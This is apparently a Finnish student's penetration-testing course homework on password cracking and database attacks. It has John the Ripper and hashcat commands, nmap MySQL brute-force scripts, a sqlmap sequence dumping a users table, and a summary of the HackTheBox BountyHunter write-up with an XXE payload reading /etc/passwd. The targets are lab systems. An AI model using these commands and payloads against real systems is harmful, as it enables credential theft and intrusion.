# H6: Hunter2

* TOC
{toc}

# z) Tiivistä: The Art of Hacking: [Hacking User Credentials](https://learning.oreilly.com/videos/the-art-of/9780135767849/9780135767849-SPTT_06_01/)

  - Datan säilöminen ja siirtäminen vaativat molemmat suojaustoimenpiteitä
  - Low hanging fruit:
    - Default pws, Pw reuse, Pws like admin, root, etc, Simple pws 
    - MITM:
      - Against clear text protocols
      - Relay attacks - directly from device 
      - Against ciphered protocols
  - Brute Forcing: Medusa, THC-Hydra, Brutus, Metasp(l?)oit, Dirbuster, wfuzz
  - Enumerating users: SMB/NetBIOS/SAMBA, Nmap scripting engine, Metasploit auxilary/scanner/smb/smb_enumusers
  - PW säilöntä: 
    - Hashing: selkoteksti -> hashing algoritmi -> kryptattu viesti
  - PW kräkkäys helppoa koska: 
    - CPU:n lisäksi GPU:t käytössä
    - Heikot algoritmit
    - Sanakirjat (dictionaries) kuten sateenkaaritaulut (rainbow tables) ja tietomurrot joiden pohjalta laadittu salasanalistoja
    - Kuorman jakaminen CPU:den kesken
    - Windowsissa ei suolausta (salt) salasanoissa, toisin kuin Linuxissa 

## JtR: 

```bash
john # Näyttää JtR version ja optiot
john salasanalista.txt # aloittaa kräkkäyksen
john --show --format=nt salasanalista.txt # näyttää nt-formaattia olevat kräkätyt pwt  
john --rules --wordlist=/usr/share/john/password.lst --format=lm salasanalista.txt
```

  - Windowsissa entuudesta ollut hash LM mutta nykyisin NT, joka on turvallisempi, Windows käyttää molempia
  - LM jakaa salasanat kahtia ja tallentaa ne suurin kirjaimin
  - john.pot säilöö kaikki kräkätyt slsanat ja niiden hashit, john.rec missä lopetit kräkkäyksen

## Hashcat 
[https://learning.oreilly.com/videos/the-art-of/9780135767849/9780135767849-SPTT_06_06/](https://learning.oreilly.com/videos/the-art-of/9780135767849/9780135767849-SPTT_06_06/)

  - GPU-tuki, 200+ hashing algoritmia, kaikilla oma fläginro

```bash
# LM pw kräkking, NT flägillä -m 1000 
hashcat --potfile-path cracked.pot -m 3000 pw_hashes.txt -a 3 
# --show flägi näyttää kräkätyt pwt, --username kenelle pw kuuluu
```

## PW:den parantaminen

  - Kaksi näkökulmaa: käyttäjä ja organisaatio
  - Kryptattujen salasanojen suolaus
  - Pidemmät salasanat
  - Kaksitahoinen tunnistautuminen

## Hacking DBs
(Ei ollut enää tehtävän scopessa mutta tuli vahingossa tehtyä)

  - DBt säilövät tärkeimmän tiedon
  - DB:t rakentuvat SQL:lle ja tauluille joita yhditää avaimet
  - Sarakkeilla kenttien nimet, riveillä data

### Basics MySQL 

```bash
mysql --host=localhost --user=root --password=lab
# sisällä kannassa
SELECT @@version
show tables;
desc tbl_users;
SELECT username FROM tbl_users;
SELECT password FROM tbl_users;
SELECT credit_card FROM tbl_users;
UPDATE tbl_users SET credit_card = 'null' WHERE id = 1;
SELECT credit_card FROM tbl_users;
```

## Attacing DBs

  - SQL injektiot
  - DoS
  - Authentication / Autherization attacks
    - default pws
    - permissions misconf 
  - DB recon: 
    - nmap: usr/share/nmap/scripts ls \*sql\*

### Nmap
 
```bash
## skannataan db
nmap -p 3306 --script="mysql-info" 127.0.0.1 
## palauttaa kannan käyttäjänimiä
nmap -p 3306 --script="mysql-enum" 127.0.0.1
## brute force attack
nmap -p 3306 --script="mysql-brute" 127.0.0.1
```

Manual SQL injection

  - Löydä kenttä
  - Kokeile ' 
  - Luo kysely

```bash
## probing bd 
sqlmap -u localhost?view=id2 
## id is vulnerable 
## Yrittää löytää db:t 
sqlmap -u localhost?view=id2 --dbs
## Kokeilee löydää taulut dbstä 
sqlmap -u localhost?view=id2 --tables 
# 
sqlmap -u localhost?view=id2 --columns -T tbl_users 
# 
sqlmap -u localhost?view=id2 --dump -T tbl_users 
```

### Automated Scanners

  - Nessus, Nexpose, Qualys, Imperva Scuba
  - Lähettää kyselyjä palvelimelle selvittääkseen tietokannan ja version 
  - Etsii mitä hyökkäyksiä kantaan voidaan lähettää

## Defendin DBs

  - Prepared statemenst
  - Escape input
  - Least privilege auth
  - DB patched
  - No direct network access
  - Segmentation 
    - Secure zone, limited access
    - Backup, DB server, Web
    - Encryption kaikissa vaiheissa tiedonvälitystä, myös lähiverkon sisällä
    - Kryptaus myös säilöessä dataa

# z) Tiivistä: HtB eläköitynyt esimerkki BountyHunter
[https://0xdf.gitlab.io/2021/11/20/htb-bountyhunter.html](https://0xdf.gitlab.io/2021/11/20/htb-bountyhunter.html)

Valitaan esimerkiksi ensimmäinen [https://0xdf.gitlab.io/](https://0xdf.gitlab.io/) kone jonka base points on "Easy". Lisäksi siitä löytyy IppSec:n esimerkkiratkaisuvideo [https://www.youtube.com/watch?v=5axsDhumfhU](https://www.youtube.com/watch?v=5axsDhumfhU). Lisäksi se on verkkosivu jolle murtautuminen on aina mielenkiintoista (että osaisi siltä suojautua). 

## Recon

```bash 
# Skannaa kaikki portit osoitteesta 10.10.11.100 10000pakettia/s ja tallenna tiedostoon nmap-alltcp 
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.100
# Skannausraportti
Nmap scan report for 10.10.11.100
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
# Skannaa portit 22 ja 80 versioden tunnistuksella ja default safe skripteillä 
nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.100
# Porttiraportti
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sen jälkeen selailee manuaalisesti sivua ja menee osoitteeseen /log_submit.php, jonka jälkeen käyttää [Feroxbusteria](https://www.kali.org/tools/feroxbuster/) php-sivua vastaan. FB:tä käytetään Forced Browsingiin. 

```bash
# Forced browse tässä osoitteessa oleva php-sivu
feroxbuster -u http://10.10.11.100 -x php
# Tuloksissa näkyy db.php
200        0l        0w        0c http://10.10.11.100/db.php
```

Response headers vahvistaa että Apache-versio on minkä nmap raportoi. Post request minkä bounty report lähettää:
```
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 227
Origin: http://10.10.11.100
DNT: 1
Connection: close
Referer: http://10.10.11.100/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5UaXRsZTwvdGl0bGU%2BCgkJPGN3ZT5DV0U8L2N3ZT4KCQk8Y3Zzcz45Ljg8L2N2c3M%2BCgkJPHJld2FyZD4xLDAwMCwwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```

Päättelee että base64-koodattua ja url-koodattua, = muuttuu %3d. Käyttää Burb Decoderia, decode as url ja sitten base64. Tulos on XML:ää. 

## XML External Entities attack

Jos sivu ei käsittele oikein XML inputtia, hyökkääjä voi syöttää lukea ja muokata dataa. Server-Side Request Forgeries (SSRF) on tekniikan edistyneempää käyttöä, yksinkertaisessa XXE:ssä tiedostojen lukeminen. 

### Esimerkki

_The first line is very similar to what is sent in the POST for BountyHunter, and the last line is the XML data itself. The middle lines are defining an entity which includes the variable &file which is the contents of the /etc/passwd file. This allows the user to send in the contents of files they can’t read as input, and if that input is displayed back, then the exploit allows for file read._

```xml 
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

### POC on BountyHunter

Tärkeää noudattaa alkuperäisen datan rakennetta: 

```xml 
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT bar ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>CWE</cwe>
		<cvss>9.8</cvss>
		<reward>1,000,000</reward>
		</bugreport>
```

_The DOCTYPE name (foo) and the ELEMENT name (bar) are not important. It’s the entity that’s defined, in this case, xxe, which will be the contents of /etc/passwd that matters. I’ll reference that value later with the variable name proceeded by & and ending with ;. I’ll throw that into a file and base64 encode it (-w0 to prevent line wrapping):_

```bash
base64 -w0 xxe-passwd
# generoi salasanan base64 koodauksella
```

...tbcontinued [https://0xdf.gitlab.io/2021/11/20/htb-bountyhunter.html#xxe-file-read](https://0xdf.gitlab.io/2021/11/20/htb-bountyhunter.html#xxe-file-read)

# a) Kolme tiivistettä 
_Tee 3 tiivistettä eri ohjelmilla ja arvaa ne hashcatilla. Tiivistä jokin oma sana, ei sanaa 'hashcat'. Voit käyttää tässä demossa itse tehtyä sanakirjaa, jossa on oikea ratkaisu muutaman väärän joukossa. Kuvaile myös, miten teit tiivisteet._

Katsotaan ohjeita [https://miloserdov.org/?p=1272](https://miloserdov.org/?p=1272). Asennetaan pari ohjelmaa. 

```bash
# alustus
sudo apt-get update
sudo apt install pip
# asennetaan omnihash
sudo pip install omnihash[sha3,pyblake2]
# luodaan tiiviste "salasana":sta 
sudo omnihash salasana
# omnihashin luomat tiivisteet
  BLAKE2B:               46bd62fc256e709a6a673956e2b5c6baf33d99c74b668a49e1c20e5c4753648fd99b9e8bc81cea35103572f276487ac4dd0e484909507ba9a0ec053cbffbd995
  BLAKE2S:               c6bff1de63d2be14a07f4897a7d8ba145bdb73542b1daac2095480067713d2e1
  MD4:                   761870a6cc88f886222864497d326ae1
  MD5:                   e7e941b1f09f266540c6780db51d5f58
  MD5-SHA1:              e7e941b1f09f266540c6780db51d5f58c7e6477ecef29604380f3185e205c3cc4ef565f3
  RIPEMD160:             0d758bf91634037876d7c0d0c759c0b8c3aca1d4
  SHA1:                  c7e6477ecef29604380f3185e205c3cc4ef565f3
  SHA224:                9ec2d00f9460188a89c5392b3104c1b3c6958456934822cc7968ba92
  SHA256:                075a421a01fe4984b4ade4a89afec861f9a435f54b5bced6d0a0e5a8792e521c
  SHA384:                2730285e027c93234b4560c00e6e0a5d1404dadbd1bf4d785e21b766f4904879bf6e758377b7340eb2b55709f7562ac4
  SHA3_224:              97651e46f41cd416a2d853365907c8e0c1d8d6a25e115110c2f3784e
  SHA3_256:              4ec6970d138c1ce74ab481781caef28f88e3edd346205e890dd2c806b0255910
  SHA3_384:              5e63e391dfbab832198bb34d58f0d78828e20ff3c04d25764db340483cabe38662041b5cc804c72ce682d52f765bac70
  SHA3_512:              7014af3107a9fc7eeead0632d7a861883748432b160670264833504313416f34fd5a401c53ee33f8cf0a75dc223dbebb8d72c1b9957da04fe3ceecaeb7b1a262
  SHA512:                0e8e646b38387254e1f677d4df3ca290b03318440b87f4d45d67fe7b7c76a6316cf616fb155a61bb489c8eae829b837ae460421c31c450bddc02daee1ee3d609
  SHA512_224:            b2abd31ea1bc1a2800bd4eee4dc2e9322837ca4aa985bcfbf2fc4b6f
  SHA512_256:            9fcf553a33a926588ef9111d6a1cb71eb5dac0b0738d50ca4e29ad1c02518f9c
```

Asennuksen jälkeen huomataan että kaverin omnihash-ohjelmaa ei löydy: [https://www.kali.org/tools/](https://www.kali.org/tools/hashdeep/) vaan: [https://en.kali.tools/all/?tool=947](https://en.kali.tools/all/?tool=947) joten poistetaan ohjelma `sudo pip uninstall omnihash[sha3,pyblake2]` ja asennetaan ohjeen seuraavat kolme ohjelmaa jotka löytyvät virallisesta Kalin dokumentaatiosta. 

## Hashdeep

## Hasher

## Hashrat 

# b) Hydra vs SSH
_Kokeile Hydraa ssh:ta vastaan._
  - _Voit kokeilla THC Hydraa esim. Metasploitable 2:n._

# c) Kokeile salasanoja
_Kokeile salasanoja omaan weppilomakkeeseen._
??? Varmaankin kokeile salasanahyökkäyksiä omaan weppilomakkeeseen.
  - _Weppilomakkeeseen hyvä työkaluja ovat Hydra tai Fuff. Tarvittaessa voit tallentaa HTTP-pyynnön (request) ZAP:lla tai mitmproxylla._
  - _Voit koodata lomakkeen itse vaikkapa Python Flask:illa. Jos haluat valmiin lomakkeen, voit esim. asentaa Juice Shop -harjoitusmaalin._

# d) Tee oma salasanalista 
_Tee oma sanalista itse tekemästäsi ja keksimästäsi weppisivusta._
  - _Voit muuttaa sivun sanalistaksi vaikkapa cewl:lla tai omalla skriptillä. Älä käytä muiden sivuja esimerkkinä vaan tee oma sivu._

# e) Murra zip-paketin salasanasuojaus
  - _Voit avata esimerkiksi zip tai pdf-tiedoston salakirjoituksen. Yksi helppo vaihtoehto on zip2john._
  - _Salatun zip-paketin saa tehtyä 'zip --encrypt -r tero.zip tero/' (iirc)_

# f) Murra jonkin muun tiedoston suojaus
_Murra jonkin muun tiedoston salasanasuojaus._
 - _Voit avata esimerkiksi zip tai pdf-tiedoston salakirjoituksen. Yksi helppo vaihtoehto on zip2john._
 - _Tiedostojen salasanojen murtaminen onnistuu mukavasti John the Ripperillä. Ks esim. https://github.com/openwall/john/tree/bleeding-jumbo/run_

# g) Salasanan taakse / ei julkiseen nettiin
_Salasanan taakse / ei julkiseen nettiin: Tiedustele perusteellisesti jokin HTB Machines verkon kone. Selitä tulokset. Luettele lähestymistavat, joilla murtautumista voisi aloittaa. (Tämä pitää laittaa piiloon, koska HTB:lla on näistä kilpailu, emmekä halua spoilata sitä)_
  - _Jos korkkaat Machines-verkon koneita, älä laita niiden raportteja nettiin. Niissä on muillakin kilpailu kesken kuin vain meillä kurssilaisilla._
  - _Aloita helpoista koneista. HTB:n sisäänkirjatuneen käyttäjän sivulla näkyy, kuinka helppoina koneita on pidetty._
  -_m) Vapaaehtoinen kilpailu: kuka saa eniten Machines-verkon aktiivisia koneita korkattua? Laita Terolle viesti, jos saat yhdenkin auki. Kerron palkinnon tunnilla._
